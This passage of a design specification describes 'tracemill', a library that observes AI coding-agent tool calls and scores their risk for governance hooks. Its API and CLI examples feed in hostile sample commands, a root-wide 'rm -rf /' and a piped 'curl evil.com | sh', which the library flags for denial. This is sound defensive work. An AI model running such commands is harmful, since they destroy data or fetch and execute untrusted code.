│   │   ├── langgraph.yaml
│   │   ├── maf.yaml
│   │   ├── opencode.yaml
│   │   ├── openhands.yaml
│   │   ├── pydantic_ai.yaml
│   │   ├── smolagents.yaml
│   │   └── sweagent.yaml
│   ├── telemetry/
│   │   └── __init__.py          # 🚧 Stub
│   └── formatting/
│       └── __init__.py          # 🚧 Stub
├── tests/
│   ├── __init__.py
│   ├── conftest.py
│   ├── fixtures/
│   │   ├── gen_fixtures.py          # Fixture data generation script
│   │   ├── aider_chat_history.md
│   │   ├── claude_session.jsonl
│   │   ├── copilot_session.jsonl
│   │   └── malformed.jsonl
│   ├── unit/
│   │   ├── __init__.py
│   │   ├── test_adapters.py
│   │   ├── test_aider_preparser.py
│   │   ├── test_callback_sink.py
│   │   ├── test_classification.py
│   │   ├── test_classify.py
│   │   ├── test_classify_shells.py
│   │   ├── test_enricher.py
│   │   ├── test_mapped_json.py
│   │   ├── test_mcp.py
│   │   ├── test_otel_adapter.py
│   │   ├── test_pipeline.py
│   │   ├── test_risk.py
│   │   └── test_types.py
│   ├── integration/
│   │   ├── __init__.py
│   │   ├── test_aider_contract.py
│   │   ├── test_new_mappings.py
│   │   ├── test_opencode_e2e.py
│   │   ├── test_pipeline_e2e.py
│   │   ├── test_yaml_comprehensive_e2e.py
│   │   └── test_yaml_e2e_real_data.py
│   ├── test_config.py
│   ├── test_copilot_preparser.py
│   └── test_sqlite_source.py
├── scripts/
│   └── check_framework_compat.py  # Weekly compat audit helper
├── pyproject.toml
├── README.md
├── SPEC.md
├── LICENSE
└── uv.lock
`

---

## §19 — Design Constraints

1. **Pure observation** — tracemill observes, enriches, and delivers. It never modifies agent behavior, injects prompts, or manages processes.

2. **Zero-code configuration** — users configure tracemill entirely through YAML and environment variables. Adding a framework = new YAML mapping. Choosing sinks = YAML config. No Python code required for normal operation.

3. **Defensive parsing** — adapters/parsers never crash. Unknown fields are ignored. Malformed input is logged and skipped.

4. **Immutable domain objects** — all events flowing through the pipeline are frozen Pydantic models. Enrichment produces new copies.

5. **Error isolation** — one failing sink cannot block others. One malformed event cannot crash the pipeline.

6. **Async-native** — sources, pipeline, and sinks are async. I/O runs in background threads where needed.

7. **No global mutable state** — config is loaded explicitly (with caching for convenience). The default engine is a module-level singleton but can be reset/replaced.

8. **Hierarchical classification** — dot-path taxonomy supports both flat queries (`has_action("validate")`) and precise queries (`has_action("validate.lint")`).

9. **Data-driven rules** — classification rules, risk scoring weights, MCP profiles, and binary metadata are all externalized to YAML files. Users can override any rule without touching Python code.

10. **Open-closed EventKind** — the kind registry is open. Any string is a valid kind. New frameworks can introduce new kinds without code changes. Canonical kinds provide autocomplete and filtering.

---

## §20 — Testing Strategy

### Unit Tests (`tests/unit/`)

13 test modules covering:
- Type construction and validation (`test_types.py`)
- Adapter parsing logic (`test_adapters.py`, `test_mapped_json.py`, `test_otel_adapter.py`)
- Parser output (`test_aider_preparser.py`)
- Sink behavior (`test_callback_sink.py`)
- Classification correctness (`test_classification.py`, `test_classify.py`, `test_classify_shells.py`, `test_mcp.py`)
- Enricher pairing/flush logic (`test_enricher.py`)
- Risk scoring (`test_risk.py`)
- Pipeline fan-out and error isolation (`test_pipeline.py`)

### Integration Tests (`tests/integration/`)

6 test modules covering:
- End-to-end pipeline flow (`test_pipeline_e2e.py`)
- YAML mapping validation against real framework data (`test_yaml_e2e_real_data.py`, `test_yaml_comprehensive_e2e.py`)
- New mapping contract tests (`test_new_mappings.py`)
- Aider parser contract (`test_aider_contract.py`)
- OpenCode mapping (`test_opencode_e2e.py`)

### Top-Level Tests

- `test_config.py` — configuration loading, precedence, env var overrides
- `test_copilot_preparser.py` — CopilotPreParser markdown + log line parsing
- `test_sqlite_source.py` — SqliteSource polling behavior

### Test Infrastructure

- `pytest-asyncio` with `asyncio_mode = "auto"`
- Fixtures in `tests/fixtures/` (sample event data)
- Python 3.11 / 3.12 / 3.13 CI matrix

---

## §21 — Implementation Status & Roadmap

### ✅ Done

| Subsystem | Status | Notes |
|-----------|--------|-------|
| Core types | ✅ Complete | SessionEvent, EventKind (75+ constants), EventMetadata, TelemetrySpan, UsageRecord |
| Base models | ✅ Complete | StrictModel, FrozenModel |
| Source ABC + 6 implementations | ✅ Complete | file_watch, file_poll, http_poll, SSE, sqlite, replay |
| Adapter ABC + 2 implementations | ✅ Complete | MappedJsonAdapter, OtelSpanAdapter |
| YAML mapping system | ✅ Complete | 15 bundled mappings, resolver, user override support |
| Preprocessor registry + 6 preprocessors | ✅ Complete | claude, cline, goose, openhands, pydantic_ai, smolagents |
| Parser system + 2 parsers | ✅ Complete | CopilotPreParser, AiderPreParser (tree-sitter based) |
| Enricher | ✅ Complete | Tool pairing, duration, classification dispatch, risk, visibility, phase |
| Classification engine | ✅ Complete | Multi-dimensional taxonomy, shell AST (bash/PS/cmd), MCP profiles, tool lookup |
| Risk scoring | ✅ Complete | Structural + flags + injection + taint + context. MITRE mappings. |
| EventPipeline | ✅ Complete | Fan-out, error isolation, enricher integration |
| CallbackSink | ✅ Complete | User-provided async handlers |
| Configuration system | ✅ Complete | Hierarchical loading, env overrides, discriminated unions, bootstrap |
| Classify data files (9 YAMLs) | ✅ Complete | Binary info, rules, profiles, risk config |
| CI/CD | ✅ Complete | Lint, test matrix, publish, weekly audits |
| Test suite | ✅ Complete | 13 unit + 6 integration + 3 top-level test modules |

### ⬜ Planned (Not Yet Implemented)

| Item | Priority | Dependencies | Notes |
|------|----------|--------------|-------|
| **SqliteSink** | High | None | Config model exists. Needs write implementation with WAL, schema migration, and batch inserts. |
| **JsonlSink** | High | None | Config model exists. Needs append-only file writing with optional size-based rotation. |
| **OtelSink** | Medium | `telemetry/` | Export spans to OTEL collector. Requires `opentelemetry-sdk` optional dependency. |
| **S3Sink** | Low | None | Config model exists. Needs `boto3` optional dependency, buffered upload, key formatting. |
| **Telemetry instrumentation** | Medium | `opentelemetry-sdk` | Counters, histograms for pipeline metrics. |
| **Formatting** | Low | None | Human-readable event display for terminal/debugging. |
| **CLI runner** | Medium | All sinks | `tracemill run` command that instantiates pipelines from config and runs until interrupted. |
| **EventBus** | Low | None | Optional pub/sub for in-process lightweight consumers. |
| **SDK push mode** | Medium | Sinks | In-process event push (no file watch). Uses SDKConfig batch/flush settings. |
| **Gate module** | Medium | ClassificationEngine, risk scoring | Sync scoring path + YAML policy engine + I/O adapters (stdio, REST, callback). See §22. |

### Implementation Order (Recommended)

`
1. SqliteSink         → enables CodePlane integration
2. JsonlSink          → enables local file-based storage
3. CLI runner          → enables standalone operation from tracemill.yaml
4. Telemetry package   → enables observability of tracemill itself
5. OtelSink           → enables distributed tracing export
6. SDK push mode       → enables embedded library usage without files
7. Formatting          → enables debugging / CLI display
8. S3Sink             → enables cloud archival
9. EventBus           → enables lightweight in-process consumers
`

---

## §22 — Assessment API & Integration Patterns

*Event in → assessment out. Everything after is someone else's code.*

### What It Is

tracemill is a **scoring library**. It observes agent tool calls, classifies them, evaluates governance rules, and produces a `GovernanceAssessment`. It does not issue verdicts. It does not decide whether to block or allow. It does not enforce.

The consumer — whoever is operating the agent — decides what to do with the assessment. Block the tool, allow it, escalate to a human, log and ignore, auto-deny anything above risk 80 — all consumer logic, all outside tracemill.

### The Interface

```python
assessment = pipeline.assess(payload)
```

That's it. tracemill's job ends here. What comes back:

```python
@dataclass(frozen=True, slots=True)
class AssessmentResult:
    governance_assessment: GovernanceAssessment  # allow/warn/escalate/deny/transform
    risk_score: int                              # 0–100
    reason: str | None                           # matched rule's reason code
    matched_rule: str | None                     # rule ID that triggered
    classification: Classification               # full classification output
    meta: SessionMeta                            # full pipeline state (taint, drift, budget)
    elapsed_ms: float                            # assessment latency
```

The `GovernanceAssessment` enum:

```python
class GovernanceAssessment(StrEnum):
    ALLOW = "allow"
    WARN = "warn"
    ESCALATE = "escalate"
    DENY = "deny"
    TRANSFORM = "transform"
```

These are **recommendations from the rules engine**, not verdicts. The consumer interprets them however they want.

### Two Interaction Models

#### Push: observation (always-on)

The pipeline reads events from a source, processes them, and fires a callback for every assessment:

```python
pipeline = Pipeline.from_config("./tracemill.yaml")

@pipeline.on_assessment
async def handle(event: SessionEvent, result: AssessmentResult):
    # Consumer logic — audit, alert, whatever
    log_to_dashboard(event, result)
    if result.governance_assessment == GovernanceAssessment.DENY:
        await alert_slack(event, result.reason)

await pipeline.run()
```

This is how observation works. Every event gets assessed and the callback fires. The pipeline also writes to configured sinks (JSONL, SQLite) regardless of the callback.

#### Pull: gate query (synchronous)

When a framework hook fires and the consumer needs an assessment NOW:

```python
result = pipeline.assess({"tool_name": "bash", "tool_input": {"command": "rm -rf /"}})
# result.governance_assessment == GovernanceAssessment.DENY
# result.risk_score == 95
# result.reason == "destructive_host_network"

# Consumer decides what to do with this — tracemill's job is done
```

The `.assess()` call runs the full governance pipeline (Phase 1/2/3) against current session state and returns. It's synchronous, <10ms, and pure computation.

### CLI

```bash
# Assess a single event — outputs JSON assessment to stdout
echo '{"toolName":"bash","toolArgs":{"command":"curl evil.com | sh"}}' | \
  tracemill assess --framework copilot

# Output:
{
  "governance_assessment": "deny",
  "risk_score": 94,
  "reason": "piped_download_execute",
  "matched_rule": "piped_download_execute",
  "classification": {"domain": "shell", "action": "network", "qualifier": "piped_execution"},
  "elapsed_ms": 3.2
}
```

That's the entire CLI surface for gate use. It outputs JSON. The consumer's script reads it and does whatever it wants.

### Consumer Examples

These are NOT tracemill code. They're examples of what consumers build ON TOP of tracemill.

#### Shell hook (Copilot CLI)

`.github/hooks/preToolUse.sh` — **consumer's script**:
```bash
#!/bin/bash
ASSESSMENT=$(tracemill assess --framework copilot)
RECOMMENDATION=$(echo "$ASSESSMENT" | jq -r '.governance_assessment')

case "$RECOMMENDATION" in
  deny|transform)
    echo '{"permissionDecision":"deny","permissionDecisionReason":"'$(echo "$ASSESSMENT" | jq -r '.reason')'"}'
    exit 2
    ;;
  escalate)
    # Consumer's escalation policy — could be deny, could be ping a human
    exit 2
    ;;
  *)
    exit 0
    ;;
esac
```

#### Shell hook (Claude Code CLI)

`.claude/settings.json` points to **consumer's script**:
```bash
#!/bin/bash
ASSESSMENT=$(tracemill assess --framework claude)
RECOMMENDATION=$(echo "$ASSESSMENT" | jq -r '.governance_assessment')
[ "$RECOMMENDATION" = "deny" ] && exit 2
exit 0
```

#### SDK callback (Copilot SDK)

```python
from copilot.session import PermissionRequestResult
from tracemill import Pipeline

pipeline = Pipeline.from_config("./tracemill.yaml")
asyncio.create_task(pipeline.run())

async def permission_handler(request, invocation):
    result = pipeline.assess({
        "tool_name": request.tool_name or request.kind,
        "tool_input": {"command": request.full_command_text},
    })
    # Consumer decides:
    if result.governance_assessment in ("deny", "transform"):
        return PermissionRequestResult(kind="reject")
    if result.governance_assessment == "escalate":
        # Consumer's escalation — maybe block, maybe ask a human
        decision = await ask_team_lead(result)
        return decision
    return PermissionRequestResult(kind="approve-once")
```

#### SDK callback (Claude Code SDK)

```python
from claude_code_sdk import PermissionResultAllow, PermissionResultDeny
from tracemill import Pipeline

pipeline = Pipeline.from_config("./tracemill.yaml")
asyncio.create_task(pipeline.run())

async def can_use_tool(tool_name, input_data, context):
    result = pipeline.assess({"tool_name": tool_name, "tool_input": input_data})
    # Consumer decides:
    if result.governance_assessment in ("deny", "escalate", "transform"):
        return PermissionResultDeny(message=result.reason)
    return PermissionResultAllow()
```

### What tracemill Owns vs What the Consumer Owns

| tracemill | Consumer |
|-----------|----------|
| Observation pipeline (always-on) | Hook scripts |
| Event parsing (framework mappings) | Enforcement logic (block/allow) |
| Classification + risk scoring | Escalation flow (human-in-the-loop) |
| Rule evaluation → `GovernanceAssessment` | Timeout handling |
| Session state (taint, drift, budget) | Exit code mapping |
| Storage (sinks: JSONL, SQLite) | Notification channels (Slack, email) |
| `.assess()` API | What to do with the assessment |

### The Single Flow

```
1. Agent session starts
2. tracemill observation pipeline starts (reads from configured source)
3. Events stream in → Parse → Phase 1/2/3 → GovernanceAssessment
   • State accumulates (taint, drift, budget)
   • on_assessment callback fires (if registered)
   • Sinks persist (always)
4. IF consumer's hook fires (pre-execution):
   a. Consumer's hook script/callback calls tracemill assess
   b. Pipeline runs Phase 1/2/3 against current session state
   c. Returns AssessmentResult to consumer
   d. Consumer decides allow/deny/escalate (their code, their logic)
   e. Consumer returns decision to framework
5. Observation pipeline continues:
   • Allowed events: appear in source, pipeline recognizes (dedup), skips re-processing
   • Denied events: never in source, pipeline emits synthetic tool.blocked event
```

### Deduplication

The `.assess()` call updates pipeline state (Phase 1: taint, budget, drift) but does NOT persist to sinks. Persistence happens only when the observation pipeline encounters the event from its source:

- **Allowed events:** Observation sees them naturally, recognizes pre-assessed (by correlation), attaches pre-computed assessment, persists once.
- **Denied events:** Never appear in source. Pipeline emits a synthetic `tool.blocked` event into the stream so sinks have a complete audit record.

### Configuration (`tracemill.yaml`)

tracemill's config covers observation only. No enforcement config, no verdict mapping, no escalation policy:

```yaml
pipelines:
  copilot:
    source:
      type: sqlite
      path: ~/.config/github-copilot/chat.db
    framework: copilot
    sinks:
      - type: jsonl
        path: ./traces/copilot.jsonl
```

Rules live in `governance_rules.yaml`. They produce assessments, not enforcement decisions.

### Pipeline API

```python
class Pipeline:
    """Observation + assessment. No enforcement."""

    @classmethod
    def from_config(cls, config_path: Path, pipeline_name: str) -> "Pipeline":
        """Load pipeline from tracemill.yaml."""
        ...

    def assess(self, payload: dict) -> AssessmentResult:
        """Synchronous assessment against current session state.

        Runs Parse → Phase 1/2/3 → returns AssessmentResult.
        Updates session state (taint, budget, drift).
        Does NOT persist to sinks.
        """
        ...

    def on_assessment(self, callback: Callable) -> None:
        """Register callback for observation assessments (push model)."""
        ...

    async def run(self) -> None:
        """Start always-on observation loop."""
        ...
```

### Design Constraints

1. **tracemill never decides** — it assesses. The consumer decides enforcement.
2. **No Verdict type** — tracemill has no concept of allow/deny as a binary decision.
3. **No enforcement config** — no `gate.enabled`, no `escalate_policy`, no exit code mapping.
4. **Assessment is always computed** — whether or not anyone calls `.assess()`, observation produces assessments for every event.
5. **`.assess()` is synchronous** — <10ms p99, pure computation against accumulated state.
6. **Session state is shared** — `.assess()` and observation share the same state (taint, drift, budget). Gate queries see full history.
7. **No framework dependencies** — tracemill never imports Copilot, Claude, LangGraph, etc.
8. **Rules are data** — `governance_rules.yaml`. Turing-incomplete.
9. **Callbacks are optional** — `on_assessment` is for consumers who want push. Sinks persist regardless.

### Framework Compatibility

| # | Platform | Hook type | Consumer calls | Gateable? |
|---|----------|-----------|----------------|-----------|
| 1 | **Copilot CLI** | Shell script | `tracemill assess --framework copilot` | ✓ |
| 2 | **Copilot Cloud** | Shell script | Same | ✓ |
| 3 | **Copilot SDK** | In-process | `pipeline.assess(payload)` | ✓ |
| 4 | **Claude Code CLI** | Shell script | `tracemill assess --framework claude` | ✓ |
| 5 | **Claude Code SDK** | In-process | `pipeline.assess(payload)` | ✓ |
| 6 | **Cline** | Shell script | `tracemill assess --framework cline` | ✓ |
| 7 | **OpenHands** | Shell script | `tracemill assess --framework openhands` | ✓ |
| 8 | **Goose** | In-process | `pipeline.assess(payload)` | ✓ |
| 9 | **OpenCode** | In-process | `pipeline.assess(payload)` | ✓ |
| 10 | **LangGraph** | In-process | `pipeline.assess(payload)` | ✓ |
| 11 | **CrewAI** | In-process | `pipeline.assess(payload)` | ✓ |
| 12 | **PydanticAI** | In-process | `pipeline.assess(payload)` | ✓ |
| 13 | **MAF / Semantic Kernel** | In-process | `pipeline.assess(payload)` | ✓ |
| 14 | **Aider** | None | — | ✗ (observation only) |
| 15 | **smolagents** | None | — | ✗ (observation only) |
| 16 | **SWE-agent** | None | — | ✗ (observation only) |

Rows 14–16 have no pre-execution hook. tracemill observes and assesses their events, but no consumer can block tool calls.

### File Structure

```
src/tracemill/
├── governance/              # The engine (classification + rules + state)
│   ├── pipeline.py          # GovernancePipeline (Phase 1/2/3)
│   ├── rules.py             # Rule, Predicate, evaluate_rules()
│   ├── labeler.py           # GovernanceLabeler
│   ├── state.py             # SessionState (taint, budget, drift)
│   └── ...
├── assess/                  # Public assessment interface
│   ├── __init__.py          # AssessmentResult, GovernanceAssessment
│   └── types.py             # Dataclasses
├── classify/                # Classification engine
├── pipeline/                # Sources, sinks, orchestration
└── mappings/                # Framework YAML definitions
```

---

## §23 — Success Criteria

The library is "done" when:

1. **Three sink implementations** (SQLite, JSONL, Callback) are production-quality with tests
2. **CLI runner** can start all pipelines from `tracemill.yaml` and run indefinitely
3. **Any JSONL-emitting framework** can be added with only a YAML file (no code)
4. **Non-JSONL frameworks** (Copilot SQLite, Aider markdown) work via parser + mapping
5. **Classification** is stable: tool taxonomy covers 95%+ of observed tool calls without `unknown`
6. **Risk scoring** produces meaningful differentiation (not all-50s)
7. **End-to-end latency** from event ingestion to sink write is < 10ms p99 for in-memory sinks
8. **Zero-crash guarantee**: malformed input, failed sinks, and unexpected data never crash the pipeline
9. **Config bootstrap**: first `pip install tracemill` + any config access creates `~/.tracemill/` with working defaults
10. **CI green**: lint + tests pass on Python 3.11, 3.12, 3.13
